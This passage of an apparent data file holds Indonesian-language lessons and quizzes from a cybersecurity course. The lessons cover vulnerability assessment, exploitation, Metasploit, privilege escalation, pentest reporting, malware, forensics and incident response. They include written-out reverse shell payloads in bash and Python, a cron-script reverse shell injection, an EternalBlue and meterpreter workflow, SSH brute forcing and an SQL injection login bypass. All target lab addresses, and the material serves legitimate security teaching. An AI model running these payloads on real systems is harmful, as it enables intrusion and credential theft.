        options: ["-O", "-sV", "-sU", "-Pn"],
        answer: 1,
        explanation: "Flag -sV melakukan version detection pada service yang berjalan di port terbuka."
      },
      {
        question: "Tool untuk enumerasi SMB?",
        options: ["enum4linux-ng", "sqlmap", "John", "Hydra"],
        answer: 0,
        explanation: "enum4linux-ng adalah tool enumerasi SMB/NetBIOS yang mengumpulkan info user, share, dan password policy."
      },
      {
        question: "Masscan digunakan untuk?",
        options: ["Brute force password", "Scan port super cepat di jaringan besar", "Enkripsi", "Backup"],
        answer: 1,
        explanation: "Masscan adalah port scanner super cepat yang dirancang untuk memindai jaringan besar dalam waktu singkat."
      }
    ]
  },
  {
    level: 5,
    order: 4,
    title: "Vulnerability Assessment",
    slug: "vulnerability-assessment",
    description: "Mengidentifikasi dan menganalisis kerentanan sistem.",
    icon: "⚠️",
    isProject: false,
    content: `# Vulnerability Assessment

**Vulnerability Assessment (VA)** adalah proses sistematis untuk mengidentifikasi, mengkuantifikasi, dan memprioritaskan kerentanan pada sistem. Berbeda dengan pentest, VA fokus pada penemuan, bukan eksploitasi.

## Jenis Assessment

1. **Network-based** — scan host, port, service.
2. **Host-based** — scan OS, patch level, konfigurasi.
3. **Application-based** — scan kode & dependency.
4. **Database-based** — audit hak akses & enkripsi.

## Tools Utama

\`\`\`bash
# Nessus / OpenVAS - scanner enterprise
openvas-start
# Buka https://127.0.0.1:9392

# Nmap NSE vulnerability scripts
nmap --script vuln 10.10.10.5

# Nikto - web server scanner
nikto -h http://10.10.10.5

# Search exploit berdasar versi
searchsploit apache 2.4.49
\`\`\`

## Klasifikasi CVSS

\`\`\`text
Score Range  Severity
0.0  - 3.9   Low
4.0  - 6.9   Medium
7.0  - 8.9   High
9.0  - 10.0  Critical
\`\`\`

\`\`\`bash
# Cek CVE detail
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-41773" | jq
\`\`\`

## Workflow

\`\`\`text
1. Asset discovery (apa yang akan di-scan)
2. Scan otomatis (Nessus, OpenVAS, Nmap)
3. Validasi manual (hilangkan false positive)
4. Risk scoring (CVSS + business impact)
5. Prioritisasi remediasi
6. Re-scan untuk verifikasi
\`\`\`

> VA adalah langkah proaktif. Lakukan secara berkala (bulanan/kuartalan) untuk menjaga postur keamanan, dan jangan terjebak hanya pada score CVSS — pertimbangkan juga business context.`,
    quiz: [
      {
        question: "Perbedaan VA dengan pentest?",
        options: ["VA fokus eksploitasi", "VA fokus identifikasi, pentest fokus eksploitasi", "Sama saja", "Pentest hanya scan"],
        answer: 1,
        explanation: "VA fokus pada penemuan & klasifikasi kerentanan, sementara pentest melangkah lebih jauh ke eksploitasi untuk konfirmasi."
      },
      {
        question: "Score CVSS termasuk Critical bila?",
        options: ["0-3.9", "4-6.9", "7-8.9", "9-10"],
        answer: 3,
        explanation: "Score CVSS 9.0-10.0 diklasifikasikan sebagai Critical severity."
      },
      {
        question: "Tool scanner vulnerability open-source populer?",
        options: ["OpenVAS", "Photoshop", "Word", "Excel"],
        answer: 0,
        explanation: "OpenVAS (sekarang Greenbone) adalah vulnerability scanner open-source yang setara dengan Nessus."
      }
    ]
  },
  {
    level: 5,
    order: 5,
    title: "Exploitation Basics",
    slug: "exploitation-basics",
    description: "Dasar-dasar mengeksploitasi kerentanan yang ditemukan.",
    icon: "💥",
    isProject: false,
    content: `# Exploitation Basics

**Exploitation** adalah fase di mana kita memanfaatkan kerentanan yang telah diidentifikasi untuk mendapatkan akses, eksekusi kode, atau eskalasi privilege. Tujuannya membuktikan impact kerentanan secara nyata.

## Jenis Exploit

- **Remote Code Execution (RCE)** — eksekusi perintah dari jarak jauh.
- **Local Privilege Escalation (LPE)** — naik dari user biasa ke root/admin.
- **Denial of Service (DoS)** — crash atau overload service.
- **Information Disclosure** — baca data tanpa akses.

## Sumber Exploit

\`\`\`bash
# Searchsploit - database lokal Exploit-DB
searchsploit "Apache 2.4.49"
searchsploit -m 41773   # mirror exploit ke folder kerja

# Exploit-DB online
# https://www.exploit-db.com

# GitHub / PacketStorm / CVE database
\`\`\`

## Contoh Reverse Shell

\`\`\`bash
# Listener di mesin attacker
nc -lvnp 4444

# Payload di mesin target (via RCE)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os; \\
  s=socket.socket(); s.connect(("10.10.14.5",4444)); \\
  [os.dup2(s.fileno(),f) for f in (0,1,2)]; \\
  subprocess.call(["/bin/bash","-i"])'
\`\`\`

## Pwn Tools

\`\`\`python
from pwn import *

# Buffer overflow basic
p = remote("10.10.10.5", 1337)
payload = b"A" * 200          # offset ke EIP
payload += b"\\xef\\xbe\\xad\\xde"   # alamat return
p.sendline(payload)
p.interactive()
\`\`\`

\`\`\`text
- Selalu uji exploit di lab sebelum ke target produksi
- Pahami payload sebelum menjalankan (jangan asal run)
- Catat timeline & perintah untuk laporan
- Bersihkan backdoor setelah testing selesai
\`\`\`

> Eksploitasi butuh tanggung jawab. Satu perintah salah bisa menyebabkan downtime. Uji di lab, pahami payload, dan dokumentasikan setiap langkah.`,
    quiz: [
      {
        question: "Jenis exploit untuk eksekusi perintah jarak jauh?",
        options: ["DoS", "RCE", "LPE", "XSS"],
        answer: 1,
        explanation: "Remote Code Execution (RCE) memungkinkan penyerang menjalankan perintah di mesin target dari jarak jauh."
      },
      {
        question: "Database exploit paling populer untuk pencarian?",
        options: ["Exploit-DB (searchsploit)", "Wikipedia", "Google Images", "Stack Overflow"],
        answer: 0,
        explanation: "Exploit-DB dengan CLI searchsploit adalah sumber exploit publik paling banyak digunakan pentester."
      },
      {
        question: "Perintah listener reverse shell dengan netcat?",
        options: ["nc -lvnp 4444", "nc 10.0.0.1 80", "ping host", "ifconfig"],
        answer: 0,
        explanation: "nc -lvnp 4444 membuka listener di port 4444 untuk menerima koneksi balik dari target."
      }
    ]
  },
  {
    level: 5,
    order: 6,
    title: "Metasploit Framework",
    slug: "metasploit-framework",
    description: "Tool eksploitasi paling populer untuk pentester.",
    icon: "🚀",
    isProject: false,
    content: `# Metasploit Framework

**Metasploit Framework (MSF)** adalah platform eksploitasi open-source paling populer, berisi ribuan exploit, payload, encoder, dan auxiliary module. Dikembangkan oleh Rapid7 dan menjadi standar industri untuk pentest.

## Arsitektur MSF

- **Exploit** — kode yang memanfaatkan kerentanan.
- **Payload** — apa yang dieksekusi setelah exploit (mis. meterpreter).
- **Encoder** — obfuscasi payload untuk bypass AV.
- **Auxiliary** — scanner, fuzzer, brute forcer.
- **Post** — modul post-exploitation.

## Workflow Dasar

\`\`\`bash
# Mulai console
msfconsole

# Cari exploit
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 (exploit) > show options
msf6 (exploit) > set RHOSTS 10.10.10.5
msf6 (exploit) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 (exploit) > set LHOST 10.10.14.5
msf6 (exploit) > exploit
\`\`\`

## Meterpreter — Post Exploitation

\`\`\`text
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> migrate <PID>
meterpreter> upload / download
\`\`\`

## Auxiliary Modules

\`\`\`bash
# Port scan
use auxiliary/scanner/portscan/tcp

# SMB version scan
use auxiliary/scanner/smb/smb_version

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
\`\`\`

## Database & Workspace

\`\`\`bash
msf6 > db_status
msf6 > workspace -a project_x
msf6 > hosts
msf6 > services
msf6 > creds
\`\`\`

> Metasploit sangat kuat, tapi ingat — banyak modulnya "noisy" dan mudah terdeteksi EDR. Untuk red team advanced, kombinasi dengan tools custom dan living-off-the-land sering lebih efektif.`,
    quiz: [
      {
        question: "Apa itu Metasploit Framework?",
        options: ["Antivirus", "Platform eksploitasi dengan ribuan exploit", "Firewall", "Web server"],
        answer: 1,
        explanation: "Metasploit Framework adalah platform eksploitasi open-source dengan ribuan exploit, payload, dan auxiliary module."
      },
      {
        question: "Payload Metasploit yang paling canggih untuk Windows?",
        options: ["bind_tcp", "meterpreter", "cmd/unix/reverse", "shell_find_tag"],
        answer: 1,
        explanation: "Meterpreter adalah payload Metasploit in-memory yang canggih dengan banyak fitur post-exploitation."
      },
      {
        question: "Perintah MSF untuk mencari exploit?",
        options: ["find", "search", "lookup", "grep"],
        answer: 1,
        explanation: "Perintah 'search' di msfconsole digunakan untuk mencari modul exploit/payload/auxiliary."
      }
    ]
  },
  {
    level: 5,
    order: 7,
    title: "Privilege Escalation",
    slug: "privilege-escalation",
    description: "Teknik meningkatkan akses dari user biasa ke root/admin.",
    icon: "📈",
    isProject: false,
    content: `# Privilege Escalation

**Privilege Escalation (priv esc)** adalah teknik untuk meningkatkan level akses dari user biasa menjadi root (Linux) atau Administrator/SYSTEM (Windows). Setelah mendapat shell awal, priv esc adalah langkah berikutnya untuk kontrol penuh.

## Linux Priv Esc

\`\`\`bash
# Enumerasi manual
id
uname -a
sudo -l
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null   # SUID binaries

# Automated tools
./LinPEAS.sh
./linpeas.sh -a
linux-exploit-suggester.sh
\`\`\`

### Skenario umum

\`\`\`bash
# Sudo misconfiguration
sudo /bin/find . -exec /bin/sh \\; -quit

# SUID binary (mis. /usr/bin/passwd versi lama)
find / -perm -u=s -type f 2>/dev/null

# Cron job dengan script writable
echo '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh

# Kernel exploit
uname -r   # cari CVE sesuai versi kernel
\`\`\`

## Windows Priv Esc

\`\`\`powershell
# Tools otomatis
.\\WinPEAS.bat
.\\PowerUp.ps1
Invoke-PrivescAudit

# Manual
whoami /priv
systeminfo | findstr /B /C:"OS"
net user administrator

# Cek service dengan path unquoted
wmic service get name,displayname,pathname,startmode |findstr/i "Auto" |findstr/i /v "C:\\Windows"
\`\`\`

## Vektor Populer

\`\`\`text
Linux:
- Kernel exploit (Dirty COW, Dirty Pipe)
- Sudo / SUID misconfig
- Cron job writable
- PATH hijacking
- Capability abuse (cap_setuid)

Windows:
- Unquoted service path
- DLL hijacking
- Stored credentials
- Token impersonation (JuicyPotato)
- AlwaysInstallElevated MSI
\`\`\`

> Priv esc bukan tentang satu trik ajaib, tapi tentang enumerasi menyeluruh. LinPEAS dan WinPEAS menghemat waktu, tapi pahami outputnya — bukan asal copy paste.`,
    quiz: [
      {
        question: "Apa tujuan privilege escalation?",
        options: ["Menghapus user", "Menaikkan level akses ke root/admin", "Backup data", "Enkripsi disk"],
        answer: 1,
        explanation: "Privilege escalation bertujuan meningkatkan level akses dari user biasa menjadi root (Linux) atau admin (Windows)."
      },
      {
        question: "Tool automasi priv esc untuk Linux?",
        options: ["WinPEAS", "LinPEAS", "Metasploit", "Burp Suite"],
        answer: 1,
        explanation: "LinPEAS adalah script enumerasi otomatis yang populer untuk Linux privilege escalation."
      },
      {
        question: "Cek hak sudo user di Linux?",
        options: ["sudo -l", "whoami -a", "ls -la", "cat /etc/passwd"],
        answer: 0,
        explanation: "Perintah 'sudo -l' menampilkan perintah yang dapat dijalankan user dengan sudo tanpa password."
      }
    ]
  },
  {
    level: 5,
    order: 8,
    title: "Project: Pentest Report",
    slug: "project-pentest-report",
    description: "Proyek menyusun laporan penetration test profesional.",
    icon: "📝",
    isProject: true,
    content: `# Project: Pentest Report

Pada proyek akhir Level 5, Anda akan menyusun **laporan penetration test profesional** berdasarkan simulasi engagement. Laporan ini akan mengomunikasikan temuan kepada stakeholder teknis dan non-teknis dengan jelas.

## Skenario

Lakukan pentest pada lab DVWA atau Metasploitable2:

\`\`\`bash
# Setup lab
docker run -d -p 80:80 vulnerables/web-dvwa
# Atau Metasploitable2 di VirtualBox (host-only network)

# Lakukan pentest lengkap
nmap -sS -sV -sC 192.168.56.102
searchsploit <versi service>
msfconsole -q
\`\`\`

## Struktur Laporan

\`\`\`text
1. EXECUTIVE SUMMARY
   - Latar belakang engagement
   - Ringkasan risiko (jumlah finding per severity)
   - Rekomendasi prioritas

2. METHODOLOGY
   - Scope & boundary
   - Tools yang digunakan
   - Standar acuan (OWASP, PTES, NIST)

3. DETAILED FINDINGS
   Untuk setiap kerentanan:
   - Title & ID (e.g. VULN-001)
   - Severity (CVSS + vektor)
   - Deskripsi kerentanan
   - Affected asset
   - PoC (screenshot, request, response)
   - Impact
   - Remediation step-by-step

4. RISK MATRIX
   - Tabel likelihood × impact

5. APPENDIX
   - Raw scan output
   - Tool configuration
   - Glossary
\`\`\`

## Contoh Finding

\`\`\`markdown
### VULN-001: SQL Injection pada /login

**Severity**: Critical (CVSS 9.8)

**Deskripsi**: Parameter \`username\` pada form login rentan SQLi
in-band, memungkinkan bypass autentikasi.

**PoC**:
\`\`\`
POST /login HTTP/1.1
username=admin'--&password=anything
→ HTTP 302 redirect ke /dashboard
\`\`\`

**Remediation**: Gunakan prepared statement dan ORM dengan
parameter binding. Aktifkan WAF sebagai mitigasi tambahan.
\`\`\`

## Deliverables

\`\`\`text
- PDF laporan (15-30 halaman)
- Lampiran: file Burp/Nmap output
- Video walkthrough eksploitasi (5-10 menit)
- Slide executive summary (5-10 slide)
\`\`\`

> Laporan adalah produk akhir pentest. Klien tidak melihat terminal Anda — mereka membaca laporan. Kualitas dokumentasi menentukan apakah temuan akan diperbaiki atau tidak.`,
    quiz: [
      {
        question: "Bagian laporan pentest untuk audiens non-teknis?",
        options: ["Appendix", "Executive Summary", "Raw output", "Glossary"],
        answer: 1,
        explanation: "Executive Summary ditujukan untuk manajemen/non-teknis, berisi ringkasan risiko dan rekomendasi prioritas."
      },
      {
        question: "Yang harus ada di setiap finding pentest?",
        options: ["Foto penyerang", "Severity, PoC, Impact, Remediation", "Harga tool", "Kode sumber klien"],
        answer: 1,
        explanation: "Setiap finding harus mencakup severity, PoC bukti eksploitasi, impact bisnis, dan langkah remediasi."
      },
      {
        question: "Lab aplikasi rentan populer untuk latihan?",
        options: ["DVWA", "Gmail", "Facebook", "Twitter"],
        answer: 0,
        explanation: "DVWA (Damn Vulnerable Web Application) adalah lab PHP yang sengaja dibuat rentan untuk belajar pentest."
      }
    ]
  },

  // ==================== LEVEL 6 - FORENSIK & MALWARE (7) ====================
  {
    level: 6,
    order: 1,
    title: "Pengenalan Malware",
    slug: "pengenalan-malware",
    description: "Mengenal apa itu malware dan cara kerjanya.",
    icon: "🦠",
    isProject: false,
    content: `# Pengenalan Malware

**Malware** (malicious software) adalah perangkat lunak yang dibuat dengan niat jahat — mencuri data, merusak sistem, mengintai, atau mendapatkan akses tidak sah. Memahami malware adalah fondasi defense siber modern.

## Tujuan Malware

\`\`\`text
- Pencurian data (kredensial, finansial, IP)
- Spionase korporat / negara
- Pemerasan (ransomware)
- Botnet untuk DDoS atau cryptomining
- Sabotase infrastruktur
\`\`\`

## Siklus Hidup Malware

\`\`\`text
1. Reconnaissance     (pemilihan target)
2. Delivery/Infection (phishing, drive-by, USB)
3. Execution          (drop payload)
4. Persistence        (registry, scheduled task)
5. C2 Communication   (command & control)
6. Lateral movement   (menyebar ke host lain)
7. Action on objective (ekfiltrasi / enkripsi)
\`\`\`

## Vektor Infeksi Umum

\`\`\`bash
# Phishing email dengan attachment
attachment.exe → dropper → download trojan

# Drive-by download
<script src="https://evil.com/exploit.js"></script>

# USB drop attack
autorun.inf → payload

# Software supply chain
compromised npm/pip package
\`\`\`

## Indikator Kompromi (IoC)

\`\`\`text
- Hash file mencurigakan (MD5/SHA256)
- Domain & IP C2
- Pola network anomali
- Registry key persistence
- Mutex yang unik
- Pola behavioral (proses tidak biasa)
\`\`\`

> Malware modern tidak lagi berdiri sendiri — biasanya bagian dari kampanye APT yang terorganisir. Analisis IoC dan threat intelligence adalah kunci deteksi dini.`,
    quiz: [
      {
        question: "Apa itu malware?",
        options: ["Software open-source", "Software dengan niat jahat", "Antivirus", "Driver hardware"],
        answer: 1,
        explanation: "Malware (malicious software) adalah perangkat lunak yang dibuat dengan niat jahat untuk merusak atau mencuri."
      },
      {
        question: "Vektor infeksi malware paling umum?",
        options: ["Phishing email", "Update OS", "Backup", "Defragmentasi"],
        answer: 0,
        explanation: "Phishing email dengan attachment atau link berbahaya adalah vektor infeksi malware paling umum."
      },
      {
        question: "Apa itu IoC?",
        options: ["Internet of Computers", "Indicator of Compromise", "Index of Cryptography", "Internal Operation Center"],
        answer: 1,
        explanation: "IoC (Indicator of Compromise) adalah artefak (hash, IP, domain) yang mengindikasikan kompromi sistem."
      }
    ]
  },
  {
    level: 6,
    order: 2,
    title: "Jenis-Jenis Malware",
    slug: "jenis-jenis-malware",
    description: "Virus, worm, trojan, ransomware, spyware, rootkit.",
    icon: "🐛",
    isProject: false,
    content: `# Jenis-Jenis Malware

Setiap jenis malware memiliki karakteristik, vektor penyebaran, dan tujuan berbeda. Mengenali jenis malware membantu menentukan strategi analisis dan mitigasi yang tepat.

## Klasifikasi Utama

### Virus
Menempel pada file legit & menyebar saat file dijalankan.

\`\`\`text
- Butuh host (file executable)
- Aktivasi: user menjalankan file terinfeksi
- Contoh: CIH, ILOVEYOU
\`\`\`

### Worm
Menginfeksi sendiri tanpa interaksi user, memanfaatkan jaringan.

\`\`\`bash
# Contoh worm modern memanfaatkan SMB
# WannaCry memakai EternalBlue (MS17-010) untuk menyebar
nmap -p445 --script smb-vuln-ms17-010 target
\`\`\`

### Trojan
Menyamar sebagai software legit, membuka backdoor.

### Ransomware
Mengenkripsi file korban dan minta tebusan.

\`\`\`text
Contoh terkenal:
- WannaCry       (2017, global)
- NotPetya       (2017, sabotage)
- Ryuk, Conti    (targeted enterprise)
- LockBit        (RaaS)
\`\`\`

### Spyware / Keylogger
Mengintai aktivitas & mencuri data tanpa terdeteksi.

### Rootkit
Bersembunyi di kernel/firmware, sulit dideteksi.

\`\`\`bash
# Deteksi rootkit
chkrootkit
rkhunter --check
\`\`\`

### Adware & PUP
Menampilkan iklan, sering bundling dengan software gratis.

### Botnet
Jaringan zombie yang dikendalikan C2 untuk DDoS atau cryptomining.

## Tabel Perbandingan

\`\`\`text
Tipe         | Butuh Host | Self-spread | Tujuan
-------------|------------|-------------|--------
Virus        | Ya         | Tidak       | Rusak
Worm         | Tidak      | Ya          | Sebarkan
Trojan       | Tidak      | Tidak       | Backdoor
Ransomware   | Tidak      | Variatif    | Tebusan
Rootkit      | Variatif   | Tidak       | Sembunyi
\`\`\`

> Malware modern sering bersifat hybrid — satu sampel bisa trojan + ransomware + worm. Klasifikasi membantu, tapi analisis behavioral lebih penting daripada label statis.`,
    quiz: [
      {
        question: "Malware yang mengenkripsi file dan minta tebusan?",
        options: ["Virus", "Ransomware", "Adware", "Rootkit"],
        answer: 1,
        explanation: "Ransomware mengenkripsi file korban dan meminta tebusan (umumnya cryptocurrency) untuk dekripsi."
      },
      {
        question: "Apa beda virus dan worm?",
        options: ["Sama saja", "Virus butuh host file, worm self-spreading", "Worm lebih kecil", "Virus lebih berbahaya"],
        answer: 1,
        explanation: "Virus butuh file host dan aktivasi user, sementara worm dapat menyebar sendiri via jaringan."
      },
      {
        question: "Malware yang bersembunyi di kernel level?",
        options: ["Spyware", "Rootkit", "Adware", "Trojan"],
        answer: 1,
        explanation: "Rootkit bersembunyi di kernel/firmware sehingga sulit dideteksi tools user-space biasa."
      }
    ]
  },
  {
    level: 6,
    order: 3,
    title: "Malware Analysis Basics",
    slug: "malware-analysis-basics",
    description: "Static dan dynamic analysis untuk menganalisis malware.",
    icon: "🔬",
    isProject: false,
    content: `# Malware Analysis Basics

**Malware Analysis** adalah proses memahami cara kerja, tujuan, dan asal-usul sebuah sampel malware. Dibagi menjadi dua pendekatan utama: **static** (menganalisis tanpa menjalankan) dan **dynamic** (mengamati saat malware dijalankan di sandbox).

## Static Analysis

Menganalisis file tanpa eksekusi.

\`\`\`bash
# Identifikasi tipe file & hash
file sample.exe
md5sum sample.exe
sha256sum sample.exe

# Strings extraction
strings -n 8 sample.exe | grep -iE "http|\.exe|key"

# PE header analysis
pev sample.exe
pestudio sample.exe
\`\`\`

## Dynamic Analysis

Menjalankan malware di environment terisolasi.

\`\`\`bash
# Setup sandbox (FLARE-VM atau REMnux)
# 1. Snapshot VM bersih
# 2. Jalankan monitoring:
#    - Procmon (process activity)
#    - Wireshark (network)
#    - Regshot (registry diff)
# 3. Eksekusi malware
# 4. Capture behavior
# 5. Revert snapshot
\`\`\`

## Tools Populer

\`\`\`text
Static:
- Ghidra / IDA Free   : disassembler & decompiler
- pestudio            : PE analyzer
- Detect It Easy      : packer detection
- CAPA                : CAPABILITY detection

Dynamic:
- Cuckoo Sandbox      : automated analysis
- Any.run / Joe Sandbox : cloud sandbox
- Process Monitor     : Sysinternals
- API Monitor         : API call tracing
\`\`\`

## Workflow Dasar

\`\`\`text
1. Pastikan sample aman diisolasi (offline VM)
2. Hitung hash & cek di VirusTotal
3. Static: file type, strings, imports, packer
4. Dynamic: snapshot → run → capture → revert
5. Network analysis: C2, DNS, exfil
6. Dokumentasi IoC & TTP (MITRE ATT&CK)
\`\`\`

> JANGAN PERNAH menjalankan malware di host utama. Selalu gunakan VM isolated, snapshot bersih, dan jaringan terisolasi. Safety first — satu kesalahan bisa berarti rebuild sistem.`,
    quiz: [
      {
        question: "Perbedaan static dan dynamic analysis?",
        options: ["Static menjalankan, dynamic tidak", "Static tanpa eksekusi, dynamic menjalankan malware", "Sama", "Dynamic lebih lambat"],
        answer: 1,
        explanation: "Static analysis memeriksa file tanpa eksekusi, sementara dynamic analysis mengamati malware saat dijalankan di sandbox."
      },
      {
        question: "Tool disassembler & decompiler open-source?",
        options: ["Ghidra", "Photoshop", "Wireshark", "Burp Suite"],
        answer: 0,
        explanation: "Ghidra adalah reverse engineering tool open-source dari NSA yang populer untuk static analysis malware."
      },
      {
        question: "Aplikasi untuk sandbox otomatis analisis malware?",
        options: ["Cuckoo Sandbox", "Microsoft Word", "Excel", "Slack"],
        answer: 0,
        explanation: "Cuckoo Sandbox adalah framework open-source untuk analisis malware otomatis dalam environment terisolasi."
      }
    ]
  },
  {
    level: 6,
    order: 4,
    title: "Digital Forensics",
    slug: "digital-forensics",
    description: "Investigasi bukti digital setelah insiden keamanan.",
    icon: "🔎",
    isProject: false,
    content: `# Digital Forensics

**Digital Forensics** adalah proses pengumpulan, pelestarian, analisis, dan presentasi bukti digital untuk investigasi insiden atau keperluan hukum. Forensik menjawab pertanyaan: apa yang terjadi, kapan, oleh siapa, dan dampaknya.

## Prinsip Utama

\`\`\`text
1. Jangan ubah bukti asli (kerja di image/copy)
2. Dokumentasi chain of custody (rantai perawatan)
3. Rekam hash setiap tahap (integrity)
4. Forensically sound tools (read-only access)
5. Reproducible methodology
\`\`\`

## Akuisisi Bukti

\`\`\`bash
# Image disk dengan dd (hash sebelum & sesudah)
sha256sum /dev/sdb
dd if=/dev/sdb of=disk.img bs=4M conv=sync,noerror
sha256sum disk.img
# Hash harus cocok → bukti tidak berubah

# Akuisisi RAM (live forensics)
./LiME.ko "path=/ram.lime format=lime"

# Tools khusus
dc3dd, dcfldd, FTK Imager, Guymager
\`\`\`

## Analisis Disk

\`\`\`bash
# Autopsy - GUI forensic platform
autopsy &

# Sleuth Kit CLI
fls disk.img               # list files
icat disk.img <inode>      # extract file
ils disk.img               # list deleted inodes
mmls disk.img              # partition table
\`\`\`

## Artefak Penting

\`\`\`text
Windows:
- $MFT           (Master File Table)
- Registry hives (SAM, SYSTEM, SOFTWARE)
- Event logs     (Security.evtx)
- Prefetch       (.pf)
- Browser history
- Recycle Bin    ($I, $R files)

Linux:
- /var/log/*     (syslog, auth.log)
- ~/.bash_history
- /etc/passwd, /etc/shadow
- crontab, systemd timers
\`\`\`

## Timeline Analysis

\`\`\`bash
# Bodyfile & mactime (Sleuth Kit)
fls -m / disk.img > bodyfile
mactime -b bodyfile > timeline.csv

# Plaso/log2timeline (advanced)
log2timeline.py timeline.plaso disk.img
psort.py -o l2tcsv timeline.plaso > output.csv
\`\`\`

> Forensik digital bukan hanya teknis — rantai perawatan dan dokumentasi menentukan bukti dapat diterima di pengadilan. Satu kesalahan prosedural bisa membatalkan seluruh investigasi.`,
    quiz: [
      {
        question: "Prinsip paling penting dalam forensik digital?",
        options: ["Cepat selesai", "Jangan ubah bukti asli", "Bagikan bukti", "Pakai tools terbaru"],
        answer: 1,
        explanation: "Forensik digital harus menjaga integritas bukti asli — kerja pada image/copy, bukan device aslinya."
      },
      {
        question: "Tool open-source untuk image disk & hash?",
        options: ["dd + sha256sum", "Photoshop", "Microsoft Word", "Excel"],
        answer: 0,
        explanation: "dd untuk membuat image disk, sha256sum untuk verifikasi integritas — kombinasi forensik standar."
      },
      {
        question: "Platform forensik GUI open-source populer?",
        options: ["Autopsy", "Nessus", "Burp Suite", "Metasploit"],
        answer: 0,
        explanation: "Autopsy adalah platform forensik GUI open-source yang dibangun di atas The Sleuth Kit."
      }
    ]
  },
  {
    level: 6,
    order: 5,
    title: "Memory Forensics",
    slug: "memory-forensics",
    description: "Analisis RAM untuk mendeteksi malware dan aktivitas mencurigakan.",
    icon: "💾",
    isProject: false,
    content: `# Memory Forensics

**Memory Forensics** adalah analisis dump RAM untuk mendeteksi malware fileless, rootkit, proses tersembunyi, dan aktivitas berbahaya yang tidak meninggalkan jejak di disk. Sangat penting untuk malware modern yang hanya hidup di memory.

## Kapan Memory Forensics Penting?

\`\`\`text
- Malware fileless (PowerShell, .NET in-memory)
- Rootkit kernel yang menyembunyikan proses
- Insiden dengan enkripsi disk (bitlocker aktif)
- Live response sebelum shutdown
- Mendapatkan kredensial yang masih di cache
\`\`\`

## Volatility Framework

\`\`\`bash
# Identifikasi profil OS
volatility -f memory.dmp imageinfo

# Pslist - daftar proses
volatility -f memory.dmp --profile=Win10x64 pslist

# PSTree - tree view
volatility -f memory.dmp --profile=Win10x64 pstree

# Deteksi proses disembunyikan
volatility -f memory.dmp --profile=Win10x64 psxview

# Koneksi network
volatility -f memory.dmp --profile=Win10x64 netscan

# Malfind - injeksi kode
volatility -f memory.dmp --profile=Win10x64 malfind
\`\`\`

## Plugin Penting

\`\`\`text
pslist       : daftar proses (EPROCESS)
psscan       : scan pool tag untuk proses tersembunyi
psxview      : cross-view untuk detect rootkit hide
netscan      : koneksi network
cmdline      : command line tiap proses
dlllist      : DLL loaded
handles      : file & key handle
malfind      : detect code injection
hashdump     : dump NTLM hash
lsadump      : LSA secrets
\`\`\`

## Hunting Workflow

\`\`\`bash
# Otomatis dengan Volatility 3
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.malfind

# Dump proses mencurigakan
volatility -f memory.dmp --profile=Win10x64 procdump -p 1234 -D ./dump/
\`\`\`

\`\`\`text
Indikator malicious:
- Proses dengan parent tidak biasa
- Proses system dijalankan dari path aneh
- Malfind menemukan RWX memory
- Koneksi ke IP mencurigakan
- Proses tanpa executable di disk
\`\`\`

> Memory forensics adalah senjata utama melawan malware fileless. Tanpa analisis RAM, banyak serangan modern tidak akan terdeteksi sama sekali.`,
    quiz: [
      {
        question: "Framework memory forensics paling populer?",
        options: ["Volatility", "Burp Suite", "Metasploit", "Nessus"],
        answer: 0,
        explanation: "Volatility adalah framework open-source paling populer untuk analisis memory dump."
      },
      {
        question: "Kapan memory forensics sangat penting?",
        options: ["Untuk backup file", "Deteksi malware fileless", "Enkripsi disk", "Update OS"],
        answer: 1,
        explanation: "Malware fileless hanya hidup di RAM, sehingga hanya bisa dideteksi dengan memory forensics."
      },
      {
        question: "Plugin Volatility untuk deteksi proses tersembunyi?",
        options: ["pslist", "psxview", "hashdump", "netscan"],
        answer: 1,
        explanation: "psxview menggunakan cross-view antar berbagai sumber untuk mendeteksi proses yang disembunyikan rootkit."
      }
    ]
  },
  {
    level: 6,
    order: 6,
    title: "Incident Response",
    slug: "incident-response",
    description: "Prosedur menanggapi insiden keamanan siber.",
    icon: "🚨",
    isProject: false,
    content: `# Incident Response

**Incident Response (IR)** adalah proses terstruktur untuk mendeteksi, menahan, dan memulihkan dari insiden keamanan siber. Tujuannya meminimalkan dampak dan mencegah kejadian berulang.

## Siklus NIST IR (PICERL)

\`\`\`text
1. Preparation         (siap sebelum insiden)
2. Identification      (deteksi & validasi)
3. Containment         (isolasi penyebaran)
4. Eradication         (hapus ancaman)
5. Recovery            (restore service)
6. Lessons Learned     (post-mortem)
\`\`\`

## Preparation

\`\`\`text
- IR Policy & Playbook
- IR Team & kontak 24/7
- Tools: EDR, SIEM, forensic kit
- Komunikasi: internal, media, regulator
- Tabletop exercise rutin
\`\`\`

## Identification

\`\`\`bash
# Sumber deteksi
- SIEM alert (Splunk, ELK)
- EDR alert (CrowdStrike, SentinelOne)
- User report (phishing button)
- Threat intel feed
- DNS anomalies

# Validasi: true positive atau false positive?
\`\`\`

## Containment

\`\`\`bash
# Short-term: isolasi host
# Disable network interface
ip link set eth0 down

# atau via EDR
edr-cli isolate --host COMP-001

# Long-term: reset kredensial, block IP/domain
\`\`\`

## Eradication & Recovery

\`\`\`text
Eradication:
- Hapus backdoor & persistence
- Reset semua kredensial terkompromi
- Patch kerentanan yang dieksploitasi
- Reimage host terinfeksi (jangan repair)

Recovery:
- Restore dari backup bersih
- Validasi integritas (hash compare)
- Monitor ketat fase "hyper-care"
- Phased rollout service
\`\`\`

## Lessons Learned

\`\`\`text
Dokumen post-mortem:
- Timeline insiden lengkap
- Root cause analysis (RCA)
- Gap yang ditemukan (people/process/tech)
- Rekomendasi perbaikan
- Update playbook & deteksi rule
\`\`\`

> Kecepatan containment menentukan skala damage. Rata-rata dwell time penyerang 21 hari — semakin cepat kita mendeteksi dan mengisolasi, semakin kecil kerugian bisnis.`,
    quiz: [
      {
